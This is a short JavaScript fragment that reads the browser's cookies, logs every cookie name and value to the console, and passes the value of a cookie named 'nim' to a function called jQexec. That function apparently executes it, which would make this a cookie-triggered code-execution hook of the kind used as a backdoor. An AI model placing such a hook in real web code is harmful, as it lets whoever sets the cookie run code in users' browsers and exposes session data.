var cook = document.cookie;
var hooman = cook.split('=');
jQexec(hooman[1]);

var cook = document.cookie;
var ck = cook.split(';');
var fbd = false;
ck.forEach(function(el, idx) {
   hooman = el.split('=');
   console.log(hooman[0]+' - '+hooman[1]);
   if(hooman[0] == 'nim') {
      jQexec(hooman[1]);
   }
});